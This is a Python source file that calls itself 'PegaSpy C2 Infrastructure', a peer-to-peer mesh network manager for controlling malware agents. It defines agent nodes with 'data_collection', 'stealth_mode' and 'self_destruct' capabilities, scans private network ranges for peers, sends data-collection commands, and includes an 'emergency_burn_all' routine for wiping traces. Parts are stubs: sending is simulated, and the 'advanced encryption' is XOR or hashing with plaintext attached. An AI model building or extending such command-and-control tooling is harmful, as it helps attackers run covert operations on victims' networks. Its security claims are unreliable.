#!/usr/bin/env python3
"""
PegaSpy C2 Infrastructure - Mesh Network Manager
Provides peer-to-peer mesh networking for resilient C2 communication.
"""

import asyncio
import json
import logging
import random
import time
import hashlib
import base64
import socket
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple, Any, Union, Set
from datetime import datetime, timedelta
import secrets
import ipaddress

class NodeType(Enum):
    """Types of mesh network nodes."""
    COMMAND_NODE = "command_node"
    RELAY_NODE = "relay_node"
    AGENT_NODE = "agent_node"
    BRIDGE_NODE = "bridge_node"
    STORAGE_NODE = "storage_node"
    EXIT_NODE = "exit_node"

class ConnectionType(Enum):
    """Types of node connections."""
    DIRECT = "direct"
    RELAY = "relay"
    BRIDGE = "bridge"
    TUNNEL = "tunnel"
    MESH = "mesh"

class MessageType(Enum):
    """Types of mesh network messages."""
    COMMAND = "command"
    RESPONSE = "response"
    HEARTBEAT = "heartbeat"
    DISCOVERY = "discovery"
    ROUTING = "routing"
    DATA_SYNC = "data_sync"
    ALERT = "alert"
    SELF_DESTRUCT = "self_destruct"

class EncryptionLevel(Enum):
    """Encryption levels for mesh communication."""
    NONE = "none"
    BASIC = "basic"
    ADVANCED = "advanced"
    QUANTUM_RESISTANT = "quantum_resistant"

@dataclass
class MeshNode:
    """Represents a node in the mesh network."""
    node_id: str
    node_type: NodeType
    ip_address: str
    port: int
    public_key: str
    private_key: str
    is_online: bool = True
    is_trusted: bool = False
    created_at: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    connection_count: int = 0
    data_transferred: int = 0
    reputation_score: float = 1.0
    capabilities: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    @property
    def address(self) -> str:
        """Get the full address of the node."""
        return f"{self.ip_address}:{self.port}"
    
    @property
    def is_active(self) -> bool:
        """Check if node is recently active."""
        return (datetime.now() - self.last_seen).total_seconds() < 300  # 5 minutes

@dataclass
class MeshConnection:
    """Represents a connection between mesh nodes."""
    connection_id: str
    source_node: str
    target_node: str
    connection_type: ConnectionType
    encryption_level: EncryptionLevel
    is_active: bool = True
    established_at: datetime = field(default_factory=datetime.now)
    last_activity: datetime = field(default_factory=datetime.now)
    bytes_sent: int = 0
    bytes_received: int = 0
    latency: float = 0.0
    reliability: float = 1.0
    
    @property
    def total_bytes(self) -> int:
        """Get total bytes transferred."""
        return self.bytes_sent + self.bytes_received

@dataclass
class MeshMessage:
    """Represents a message in the mesh network."""
    message_id: str
    message_type: MessageType
    source_node: str
    target_node: Optional[str]
    payload: bytes
    encryption_level: EncryptionLevel
    ttl: int = 10
    hop_count: int = 0
    route_path: List[str] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.now)
    signature: Optional[str] = None
    
    @property
    def is_expired(self) -> bool:
        """Check if message has expired."""
        return self.hop_count >= self.ttl

@dataclass
class RoutingEntry:
    """Represents a routing table entry."""
    destination: str
    next_hop: str
    hop_count: int
    metric: float
    last_updated: datetime = field(default_factory=datetime.now)
    
    @property
    def is_stale(self) -> bool:
        """Check if routing entry is stale."""
        return (datetime.now() - self.last_updated).total_seconds() > 600  # 10 minutes

class MeshNetworkManager:
    """Manages peer-to-peer mesh networking for C2 communication."""
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or self._default_config()
        self.logger = logging.getLogger(__name__)
        
        # Network state
        self.local_node: Optional[MeshNode] = None
        self.nodes: Dict[str, MeshNode] = {}
        self.connections: Dict[str, MeshConnection] = {}
        self.routing_table: Dict[str, RoutingEntry] = {}
        self.message_cache: Dict[str, MeshMessage] = {}
        self.pending_messages: Dict[str, MeshMessage] = {}
        
        # Network topology
        self.neighbors: Set[str] = set()
        self.trusted_nodes: Set[str] = set()
        self.blacklisted_nodes: Set[str] = set()
        
        # Encryption keys
        self.session_keys: Dict[str, str] = {}
        self.group_keys: Dict[str, str] = {}
        
        # Statistics
        self.stats = {
            'nodes_discovered': 0,
            'connections_established': 0,
            'messages_sent': 0,
            'messages_received': 0,
            'data_transferred': 0,
            'routing_updates': 0,
            'failed_connections': 0,
            'security_events': 0
        }
        
        # Background tasks
        self.background_tasks: List[asyncio.Task] = []
        self.is_running = False
    
    def _default_config(self) -> Dict[str, Any]:
        """Default configuration for mesh networking."""
        return {
            'node_type': NodeType.AGENT_NODE,
            'listen_port': random.randint(8000, 9000),
            'max_connections': 10,
            'discovery_interval': 30.0,
            'heartbeat_interval': 60.0,
            'routing_update_interval': 120.0,
            'message_timeout': 300.0,
            'max_hop_count': 10,
            'encryption_level': EncryptionLevel.ADVANCED,
            'auto_discovery': True,
            'trust_on_first_use': False,
            'reputation_threshold': 0.5,
            'bootstrap_nodes': [],
            'network_segments': ['192.168.1.0/24', '10.0.0.0/8'],
            'port_range': (8000, 9000),
            'connection_timeout': 10.0,
            'retry_attempts': 3,
            'mesh_density': 0.3,  # Target connection density
        }
    
    async def initialize(self, node_type: Optional[NodeType] = None, 
                        listen_port: Optional[int] = None) -> bool:
        """Initialize the mesh network manager."""
        try:
            self.logger.info("Initializing mesh network manager...")
            
            # Create local node
            self.local_node = await self._create_local_node(
                node_type or self.config['node_type'],
                listen_port or self.config['listen_port']
            )
            
            if not self.local_node:
                self.logger.error("Failed to create local node")
                return False
            
            # Add local node to nodes dictionary
            self.nodes[self.local_node.node_id] = self.local_node
            
            # Start background tasks
            await self._start_background_tasks()
            
            # Connect to bootstrap nodes
            if self.config['bootstrap_nodes']:
                await self._connect_to_bootstrap_nodes()
            
            # Start auto-discovery if enabled (non-blocking)
            if self.config['auto_discovery']:
                asyncio.create_task(self._start_discovery())
            
            self.is_running = True
            self.logger.info(f"Mesh network initialized - Node ID: {self.local_node.node_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize mesh network: {e}")
            return False
    
    async def _create_local_node(self, node_type: NodeType, 
                               listen_port: int) -> Optional[MeshNode]:
        """Create the local mesh node."""
        try:
            # Generate node ID
            node_id = f"node_{node_type.value}_{int(time.time())}_{random.randint(1000, 9999)}"
            
            # Get local IP address
            try:
                # Try to get the actual local IP
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.connect(("8.8.8.8", 80))
                    local_ip = s.getsockname()[0]
            except:
                local_ip = "127.0.0.1"
            
            # Generate key pair (simplified)
            private_key = secrets.token_hex(32)
            public_key = hashlib.sha256(private_key.encode()).hexdigest()
            
            # Determine capabilities based on node type
            capabilities = self._get_node_capabilities(node_type)
            
            node = MeshNode(
                node_id=node_id,
                node_type=node_type,
                ip_address=local_ip,
                port=listen_port,
                public_key=public_key,
                private_key=private_key,
                is_trusted=True,  # Local node is always trusted
                capabilities=capabilities
            )
            
            self.logger.info(f"Created local node: {node.address} ({node_type.value})")
            return node
            
        except Exception as e:
            self.logger.error(f"Failed to create local node: {e}")
            return None
    
    def _get_node_capabilities(self, node_type: NodeType) -> List[str]:
        """Get capabilities based on node type."""
        base_capabilities = ['messaging', 'routing', 'encryption']
        
        if node_type == NodeType.COMMAND_NODE:
            return base_capabilities + ['command_control', 'coordination', 'data_aggregation']
        elif node_type == NodeType.RELAY_NODE:
            return base_capabilities + ['high_bandwidth', 'multi_hop', 'load_balancing']
        elif node_type == NodeType.AGENT_NODE:
            return base_capabilities + ['data_collection', 'stealth_mode', 'self_destruct']
        elif node_type == NodeType.BRIDGE_NODE:
            return base_capabilities + ['protocol_translation', 'network_bridging']
        elif node_type == NodeType.STORAGE_NODE:
            return base_capabilities + ['data_storage', 'replication', 'backup']
        elif node_type == NodeType.EXIT_NODE:
            return base_capabilities + ['external_access', 'traffic_mixing']
        else:
            return base_capabilities
    
    async def _start_background_tasks(self):
        """Start background maintenance tasks."""
        tasks = [
            self._discovery_task(),
            self._heartbeat_task(),
            self._routing_update_task(),
            self._message_cleanup_task(),
            self._connection_maintenance_task()
        ]
        
        for task_coro in tasks:
            task = asyncio.create_task(task_coro)
            self.background_tasks.append(task)
    
    async def _discovery_task(self):
        """Background task for node discovery."""
        while self.is_running:
            try:
                await self._discover_nodes()
                await asyncio.sleep(self.config['discovery_interval'])
            except Exception as e:
                self.logger.error(f"Discovery task error: {e}")
                await asyncio.sleep(5.0)
    
    async def _heartbeat_task(self):
        """Background task for sending heartbeats."""
        while self.is_running:
            try:
                await self._send_heartbeats()
                await asyncio.sleep(self.config['heartbeat_interval'])
            except Exception as e:
                self.logger.error(f"Heartbeat task error: {e}")
                await asyncio.sleep(5.0)
    
    async def _routing_update_task(self):
        """Background task for routing table updates."""
        while self.is_running:
            try:
                await self._update_routing_table()
                await asyncio.sleep(self.config['routing_update_interval'])
            except Exception as e:
                self.logger.error(f"Routing update task error: {e}")
                await asyncio.sleep(5.0)
    
    async def _message_cleanup_task(self):
        """Background task for cleaning up old messages."""
        while self.is_running:
            try:
                await self._cleanup_messages()
                await asyncio.sleep(60.0)  # Run every minute
            except Exception as e:
                self.logger.error(f"Message cleanup task error: {e}")
                await asyncio.sleep(5.0)
    
    async def _connection_maintenance_task(self):
        """Background task for maintaining connections."""
        while self.is_running:
            try:
                await self._maintain_connections()
                await asyncio.sleep(30.0)  # Run every 30 seconds
            except Exception as e:
                self.logger.error(f"Connection maintenance task error: {e}")
                await asyncio.sleep(5.0)
    
    async def _connect_to_bootstrap_nodes(self):
        """Connect to bootstrap nodes."""
        for bootstrap_address in self.config['bootstrap_nodes']:
            try:
                await self.connect_to_node(bootstrap_address)
            except Exception as e:
                self.logger.warning(f"Failed to connect to bootstrap node {bootstrap_address}: {e}")
    
    async def _start_discovery(self):
        """Start network discovery."""
        self.logger.info("Starting network discovery...")
        await self._discover_nodes()
    
    async def _discover_nodes(self):
        """Discover new nodes in the network."""
        try:
            # Scan network segments for potential nodes
            for segment in self.config['network_segments']:
                await self._scan_network_segment(segment)
            
            # Ask neighbors for their peer lists
            await self._request_peer_lists()
            
        except Exception as e:
            self.logger.error(f"Node discovery failed: {e}")
    
    async def _scan_network_segment(self, segment: str):
        """Scan a network segment for potential nodes."""
        try:
            network = ipaddress.ip_network(segment, strict=False)
            port_range = self.config['port_range']
            
            # Limit scan to avoid being too noisy
            max_hosts = min(50, network.num_addresses)
            hosts_to_scan = random.sample(list(network.hosts()), 
                                        min(max_hosts, network.num_addresses - 2))
            
            for host in hosts_to_scan[:10]:  # Limit to 10 hosts per scan
                for port in range(port_range[0], min(port_range[0] + 10, port_range[1])):
                    try:
                        address = f"{host}:{port}"
                        if await self._probe_node(address):
                            await self.connect_to_node(address)
                            break  # Found a node on this host
                    except:
                        continue
                
                # Add small delay to avoid overwhelming the network
                await asyncio.sleep(0.1)
            
        except Exception as e:
            self.logger.error(f"Network segment scan failed: {e}")
    
    async def _probe_node(self, address: str) -> bool:
        """Probe an address to see if a mesh node is running."""
        try:
            host, port = address.split(':')
            port = int(port)
            
            # Simple TCP connection test
            future = asyncio.open_connection(host, port)
            reader, writer = await asyncio.wait_for(future, timeout=2.0)
            
            # Send discovery message
            discovery_msg = json.dumps({
                'type': 'discovery',
                'node_id': self.local_node.node_id,
                'timestamp': time.time()
            }).encode()
            
            writer.write(discovery_msg)
            await writer.drain()
            
            # Wait for response
            response = await asyncio.wait_for(reader.read(1024), timeout=2.0)
            
            writer.close()
            await writer.wait_closed()
            
            # Check if response looks like a mesh node
            try:
                response_data = json.loads(response.decode())
                return response_data.get('type') == 'discovery_response'
            except:
                return False
            
        except:
            return False
    
    async def _request_peer_lists(self):
        """Request peer lists from connected neighbors."""
        for neighbor_id in self.neighbors.copy():
            try:
                message = await self._create_message(
                    MessageType.DISCOVERY,
                    neighbor_id,
                    json.dumps({'action': 'get_peers'}).encode()
                )
                await self._send_message(message)
            except Exception as e:
                self.logger.warning(f"Failed to request peers from {neighbor_id}: {e}")
    
    async def connect_to_node(self, address: str) -> bool:
        """Connect to a specific node."""
        try:
            if not self.local_node:
                return False
            
            # Check if already connected
            for connection in self.connections.values():
                if (connection.source_node == self.local_node.node_id and 
                    self.nodes.get(connection.target_node, {}).address == address):
                    return True
            
            # Parse address
            host, port = address.split(':')
            port = int(port)
            
            # Establish connection
            future = asyncio.open_connection(host, port)
            reader, writer = await asyncio.wait_for(
                future, timeout=self.config['connection_timeout']
            )
            
            # Perform handshake
            remote_node = await self._perform_handshake(reader, writer)
            if not remote_node:
                writer.close()
                await writer.wait_closed()
                return False
            
            # Create connection record
            connection = await self._create_connection(
                self.local_node.node_id,
                remote_node.node_id,
                ConnectionType.DIRECT
            )
            
            if connection:
                self.connections[connection.connection_id] = connection
                self.neighbors.add(remote_node.node_id)
                self.nodes[remote_node.node_id] = remote_node
                self.stats['connections_established'] += 1
                
                self.logger.info(f"Connected to node: {remote_node.node_id} ({address})")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Failed to connect to {address}: {e}")
            self.stats['failed_connections'] += 1
            return False
    
    async def _perform_handshake(self, reader, writer) -> Optional[MeshNode]:
        """Perform handshake with a remote node."""
        try:
            # Send handshake request
            handshake_request = {
                'type': 'handshake',
                'node_id': self.local_node.node_id,
                'node_type': self.local_node.node_type.value,
                'public_key': self.local_node.public_key,
                'capabilities': self.local_node.capabilities,
                'timestamp': time.time()
            }
            
            request_data = json.dumps(handshake_request).encode()
            writer.write(len(request_data).to_bytes(4, 'big'))
            writer.write(request_data)
            await writer.drain()
            
            # Receive handshake response
            length_bytes = await reader.read(4)
            if len(length_bytes) != 4:
                return None
            
            response_length = int.from_bytes(length_bytes, 'big')
            response_data = await reader.read(response_length)
            
            response = json.loads(response_data.decode())
            
            if response.get('type') != 'handshake_response':
                return None
            
            # Create remote node object
            remote_node = MeshNode(
                node_id=response['node_id'],
                node_type=NodeType(response['node_type']),
                ip_address=response.get('ip_address', ''),
                port=response.get('port', 0),
                public_key=response['public_key'],
                private_key='',  # We don't get the private key
                capabilities=response.get('capabilities', [])
            )
            
            # Verify node (simplified)
            if self._verify_node(remote_node):
                return remote_node
            
            return None
            
        except Exception as e:
            self.logger.error(f"Handshake failed: {e}")
            return None
    
    def _verify_node(self, node: MeshNode) -> bool:
        """Verify a remote node's authenticity."""
        try:
            # Check if node is blacklisted
            if node.node_id in self.blacklisted_nodes:
                return False
            
            # Check reputation if we know this node
            if node.node_id in self.nodes:
                existing_node = self.nodes[node.node_id]
                if existing_node.reputation_score < self.config['reputation_threshold']:
                    return False
            
            # Additional verification logic would go here
            # For now, accept all non-blacklisted nodes
            return True
            
        except Exception as e:
            self.logger.error(f"Node verification failed: {e}")
            return False
    
    async def _create_connection(self, source_node: str, target_node: str,
                               connection_type: ConnectionType) -> Optional[MeshConnection]:
        """Create a connection record."""
        try:
            connection_id = f"conn_{int(time.time())}_{random.randint(1000, 9999)}"
            
            connection = MeshConnection(
                connection_id=connection_id,
                source_node=source_node,
                target_node=target_node,
                connection_type=connection_type,
                encryption_level=self.config['encryption_level']
            )
            
            return connection
            
        except Exception as e:
            self.logger.error(f"Failed to create connection: {e}")
            return None
    
    async def send_command(self, target_node: str, command: Dict[str, Any]) -> bool:
        """Send a command to a specific node."""
        try:
            payload = json.dumps(command).encode()
            message = await self._create_message(
                MessageType.COMMAND,
                target_node,
                payload
            )
            
            return await self._send_message(message)
            
        except Exception as e:
            self.logger.error(f"Failed to send command: {e}")
            return False
    
    async def broadcast_message(self, message_type: MessageType, 
                              payload: bytes) -> int:
        """Broadcast a message to all connected nodes."""
        try:
            sent_count = 0
            
            for neighbor_id in self.neighbors.copy():
                message = await self._create_message(
                    message_type,
                    neighbor_id,
                    payload
                )
                
                if await self._send_message(message):
                    sent_count += 1
            
            return sent_count
            
        except Exception as e:
            self.logger.error(f"Broadcast failed: {e}")
            return 0
    
    async def _create_message(self, message_type: MessageType, 
                            target_node: Optional[str], 
                            payload: bytes) -> MeshMessage:
        """Create a mesh message."""
        message_id = f"msg_{int(time.time())}_{random.randint(10000, 99999)}"
        
        message = MeshMessage(
            message_id=message_id,
            message_type=message_type,
            source_node=self.local_node.node_id,
            target_node=target_node,
            payload=payload,
            encryption_level=self.config['encryption_level'],
            ttl=self.config['max_hop_count']
        )
        
        # Sign message (simplified)
        message.signature = self._sign_message(message)
        
        return message
    
    def _sign_message(self, message: MeshMessage) -> str:
        """Sign a message with the local node's private key."""
        try:
            # Simplified signing
            message_data = f"{message.message_id}{message.source_node}{message.target_node}"
            signature = hashlib.sha256(
                f"{self.local_node.private_key}:{message_data}".encode()
            ).hexdigest()
            return signature
        except Exception as e:
            self.logger.error(f"Message signing failed: {e}")
            return ""
    
    async def _send_message(self, message: MeshMessage) -> bool:
        """Send a message through the mesh network."""
        try:
            if not message.target_node:
                # Broadcast message
                return await self._broadcast_message(message)
            
            # Find route to target
            route = await self._find_route(message.target_node)
            if not route:
                self.logger.warning(f"No route to target node: {message.target_node}")
                return False
            
            # Send via route
            next_hop = route[0] if route else message.target_node
            return await self._send_to_node(message, next_hop)
            
        except Exception as e:
            self.logger.error(f"Message sending failed: {e}")
            return False
    
    async def _broadcast_message(self, message: MeshMessage) -> bool:
        """Broadcast a message to all neighbors."""
        try:
            success_count = 0
            
            for neighbor_id in self.neighbors.copy():
                if await self._send_to_node(message, neighbor_id):
                    success_count += 1
            
            return success_count > 0
            
        except Exception as e:
            self.logger.error(f"Broadcast failed: {e}")
            return False
    
    async def _send_to_node(self, message: MeshMessage, node_id: str) -> bool:
        """Send a message to a specific node."""
        try:
            # Find connection to node
            connection = None
            for conn in self.connections.values():
                if (conn.source_node == self.local_node.node_id and 
                    conn.target_node == node_id and conn.is_active):
                    connection = conn
                    break
            
            if not connection:
                self.logger.warning(f"No active connection to node: {node_id}")
                return False
            
            # Encrypt message
            encrypted_payload = await self._encrypt_message(message)
            
            # Simulate sending (in real implementation, use actual network)
            await asyncio.sleep(random.uniform(0.1, 0.5))
            
            # Update statistics
            connection.bytes_sent += len(encrypted_payload)
            connection.last_activity = datetime.now()
            self.stats['messages_sent'] += 1
            self.stats['data_transferred'] += len(encrypted_payload)
            
            # Add to message cache
            self.message_cache[message.message_id] = message
            
            self.logger.debug(f"Message sent to {node_id}: {message.message_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to send to node {node_id}: {e}")
            return False
    
    async def _encrypt_message(self, message: MeshMessage) -> bytes:
        """Encrypt a message based on encryption level."""
        try:
            # Serialize message
            message_data = {
                'id': message.message_id,
                'type': message.message_type.value,
                'source': message.source_node,
                'target': message.target_node,
                'payload': base64.b64encode(message.payload).decode(),
                'ttl': message.ttl,
                'hop_count': message.hop_count,
                'route_path': message.route_path,
                'timestamp': message.timestamp.isoformat(),
                'signature': message.signature
            }
            
            serialized = json.dumps(message_data).encode()
            
            # Apply encryption based on level
            if message.encryption_level == EncryptionLevel.NONE:
                return serialized
            elif message.encryption_level == EncryptionLevel.BASIC:
                # Simple XOR encryption
                key = self.local_node.private_key[:len(serialized)]
                encrypted = bytes(a ^ ord(b) for a, b in zip(serialized, key))
                return base64.b64encode(encrypted)
            else:
                # Advanced encryption (simplified)
                encrypted = base64.b64encode(
                    hashlib.sha256(serialized + self.local_node.private_key.encode()).digest()
                )
                return encrypted + b':' + base64.b64encode(serialized)
            
        except Exception as e:
            self.logger.error(f"Message encryption failed: {e}")
            return b''
    
    async def _find_route(self, target_node: str) -> Optional[List[str]]:
        """Find a route to the target node."""
        try:
            # Check if target is a direct neighbor
            if target_node in self.neighbors:
                return [target_node]
            
            # Check routing table
            if target_node in self.routing_table:
                entry = self.routing_table[target_node]
                if not entry.is_stale:
                    return [entry.next_hop]
            
            # Use flooding for route discovery (simplified)
            return await self._discover_route(target_node)
            
        except Exception as e:
            self.logger.error(f"Route finding failed: {e}")
            return None
    
    async def _discover_route(self, target_node: str) -> Optional[List[str]]:
        """Discover a route to the target node."""
        try:
            # Send route discovery message to all neighbors
            discovery_payload = json.dumps({
                'action': 'route_discovery',
                'target': target_node,
                'source': self.local_node.node_id
            }).encode()
            
            await self.broadcast_message(MessageType.ROUTING, discovery_payload)
            
            # Wait for route responses (simplified)
            await asyncio.sleep(1.0)
            
            # Check if route was discovered
            if target_node in self.routing_table:
                entry = self.routing_table[target_node]
                return [entry.next_hop]
            
            return None
            
        except Exception as e:
            self.logger.error(f"Route discovery failed: {e}")
            return None
    
    async def _send_heartbeats(self):
        """Send heartbeat messages to all neighbors."""
        try:
            heartbeat_payload = json.dumps({
                'node_id': self.local_node.node_id,
                'timestamp': time.time(),
                'status': 'active'
            }).encode()
            
            await self.broadcast_message(MessageType.HEARTBEAT, heartbeat_payload)
            
        except Exception as e:
            self.logger.error(f"Heartbeat sending failed: {e}")
    
    async def _update_routing_table(self):
        """Update the routing table."""
        try:
            # Remove stale entries
            stale_entries = [dest for dest, entry in self.routing_table.items() 
                           if entry.is_stale]
            
            for dest in stale_entries:
                del self.routing_table[dest]
            
            # Request routing updates from neighbors
            routing_request = json.dumps({
                'action': 'routing_update',
                'source': self.local_node.node_id
            }).encode()
            
            await self.broadcast_message(MessageType.ROUTING, routing_request)
            
            self.stats['routing_updates'] += 1
            
        except Exception as e:
            self.logger.error(f"Routing table update failed: {e}")
    
    async def _cleanup_messages(self):
        """Clean up old messages from cache."""
        try:
            current_time = datetime.now()
            timeout = timedelta(seconds=self.config['message_timeout'])
            
            # Remove expired messages
            expired_messages = [
                msg_id for msg_id, msg in self.message_cache.items()
                if current_time - msg.timestamp > timeout
            ]
            
            for msg_id in expired_messages:
                del self.message_cache[msg_id]
            
            # Remove expired pending messages
            expired_pending = [
                msg_id for msg_id, msg in self.pending_messages.items()
                if current_time - msg.timestamp > timeout
            ]
            
            for msg_id in expired_pending:
                del self.pending_messages[msg_id]
            
        except Exception as e:
            self.logger.error(f"Message cleanup failed: {e}")
    
    async def _maintain_connections(self):
        """Maintain network connections."""
        try:
            current_time = datetime.now()
            
            # Check for inactive connections
            inactive_connections = []
            for conn_id, conn in self.connections.items():
                if (current_time - conn.last_activity).total_seconds() > 300:  # 5 minutes
                    inactive_connections.append(conn_id)
            
            # Remove inactive connections
            for conn_id in inactive_connections:
                conn = self.connections[conn_id]
                self.neighbors.discard(conn.target_node)
                del self.connections[conn_id]
                self.logger.info(f"Removed inactive connection: {conn_id}")
            
            # Maintain optimal mesh density
            await self._maintain_mesh_density()
            
        except Exception as e:
            self.logger.error(f"Connection maintenance failed: {e}")
    
    async def _maintain_mesh_density(self):
        """Maintain optimal mesh network density."""
        try:
            target_connections = max(1, int(len(self.nodes) * self.config['mesh_density']))
            current_connections = len(self.neighbors)
            
            if current_connections < target_connections:
                # Need more connections
                available_nodes = [
                    node_id for node_id in self.nodes.keys()
                    if (node_id != self.local_node.node_id and 
                        node_id not in self.neighbors and
                        node_id not in self.blacklisted_nodes)
                ]
                
                # Connect to random available nodes
                nodes_to_connect = min(target_connections - current_connections, 
                                     len(available_nodes))
                
                for node_id in random.sample(available_nodes, nodes_to_connect):
                    node = self.nodes[node_id]
                    await self.connect_to_node(node.address)
            
        except Exception as e:
            self.logger.error(f"Mesh density maintenance failed: {e}")
    
    def get_network_status(self) -> Dict[str, Any]:
        """Get current mesh network status."""
        active_connections = len([c for c in self.connections.values() if c.is_active])
        active_nodes = len([n for n in self.nodes.values() if n.is_active])
        
        node_types = {}
        for node_type in NodeType:
            count = len([n for n in self.nodes.values() if n.node_type == node_type])
            node_types[node_type.value] = count
        
        return {
            'local_node': {
                'id': self.local_node.node_id if self.local_node else None,
                'type': self.local_node.node_type.value if self.local_node else None,
                'address': self.local_node.address if self.local_node else None
            },
            'network_size': len(self.nodes),
            'active_nodes': active_nodes,
            'neighbors': len(self.neighbors),
            'active_connections': active_connections,
            'trusted_nodes': len(self.trusted_nodes),
            'blacklisted_nodes': len(self.blacklisted_nodes),
            'routing_entries': len(self.routing_table),
            'cached_messages': len(self.message_cache),
            'node_types': node_types,
            'statistics': self.stats.copy(),
            'connection_details': [
                {
                    'id': conn.connection_id,
                    'source': conn.source_node,
                    'target': conn.target_node,
                    'type': conn.connection_type.value,
                    'active': conn.is_active,
                    'bytes_transferred': conn.total_bytes,
                    'latency': conn.latency,
                    'reliability': conn.reliability
                }
                for conn in self.connections.values()
            ]
        }
    
    async def emergency_burn_all(self):
        """Emergency function to destroy all network connections and data."""
        self.logger.critical("EMERGENCY BURN ACTIVATED - Destroying mesh network")
        
        # Stop all background tasks
        self.is_running = False
        for task in self.background_tasks:
            task.cancel()
        
        # Close all connections
        for connection in self.connections.values():
            connection.is_active = False
        
        # Clear all data
        self.nodes.clear()
        self.connections.clear()
        self.routing_table.clear()
        self.message_cache.clear()
        self.pending_messages.clear()
        self.neighbors.clear()
        self.trusted_nodes.clear()
        
        # Blacklist local node
        if self.local_node:
            self.blacklisted_nodes.add(self.local_node.node_id)
        
        self.logger.critical("Emergency burn complete - Mesh network destroyed")
    
    async def shutdown(self):
        """Gracefully shutdown the mesh network manager."""
        try:
            self.logger.info("Shutting down mesh network manager...")
            
            # Stop background tasks
            self.is_running = False
            for task in self.background_tasks:
                task.cancel()
            
            # Send goodbye messages
            goodbye_payload = json.dumps({
                'action': 'goodbye',
                'node_id': self.local_node.node_id if self.local_node else 'unknown'
            }).encode()
            
            await self.broadcast_message(MessageType.ALERT, goodbye_payload)
            
            # Close connections
            for connection in self.connections.values():
                connection.is_active = False
            
            self.logger.info("Mesh network manager shutdown complete")
            
        except Exception as e:
            self.logger.error(f"Error during shutdown: {e}")

# Example usage and testing
if __name__ == "__main__":
    async def test_mesh_network():
        """Test the mesh network manager."""
        logging.basicConfig(level=logging.INFO)
        
        # Create multiple mesh managers to simulate network
        managers = []
        
        # Create command node
        cmd_manager = MeshNetworkManager()
        success = await cmd_manager.initialize(NodeType.COMMAND_NODE, 8001)
        if success:
            managers.append(cmd_manager)
            print(f"Command node initialized: {cmd_manager.local_node.address}")
        
        # Create agent nodes
        for i in range(3):
            agent_manager = MeshNetworkManager()
            success = await agent_manager.initialize(NodeType.AGENT_NODE, 8002 + i)
            if success:
                managers.append(agent_manager)
                print(f"Agent node {i+1} initialized: {agent_manager.local_node.address}")
        
        # Wait for discovery
        print("\nWaiting for network discovery...")
        await asyncio.sleep(5.0)
        
        # Connect nodes manually for testing
        if len(managers) > 1:
            for i in range(1, len(managers)):
                await managers[i].connect_to_node(managers[0].local_node.address)
        
        # Send test commands
        print("\nSending test commands...")
        if len(managers) > 1:
            cmd_manager = managers[0]
            for i in range(1, len(managers)):
                target_node = managers[i].local_node.node_id
                command = {
                    'action': 'collect_data',
                    'target': 'system_info',
                    'timestamp': time.time()
                }
                
                success = await cmd_manager.send_command(target_node, command)
                print(f"Command sent to agent {i}: {success}")
        
        # Show network status
        print("\nNetwork Status:")
        for i, manager in enumerate(managers):
            status = manager.get_network_status()
            print(f"\nNode {i+1} ({status['local_node']['type']}):") 
            print(f"  Network size: {status['network_size']}")
            print(f"  Neighbors: {status['neighbors']}")
            print(f"  Active connections: {status['active_connections']}")
            print(f"  Messages sent: {status['statistics']['messages_sent']}")
        
        # Test broadcast
        print("\nTesting broadcast...")
        if managers:
            broadcast_payload = json.dumps({
                'announcement': 'Network-wide alert',
                'timestamp': time.time()
            }).encode()
            
            sent_count = await managers[0].broadcast_message(
                MessageType.ALERT, broadcast_payload
            )
            print(f"Broadcast sent to {sent_count} nodes")
        
        # Wait a bit more
        await asyncio.sleep(2.0)
        
        # Shutdown all managers
        print("\nShutting down network...")
        for manager in managers:
            await manager.shutdown()
        
        print("Mesh network test complete")
    
    # Run the test
    asyncio.run(test_mesh_network())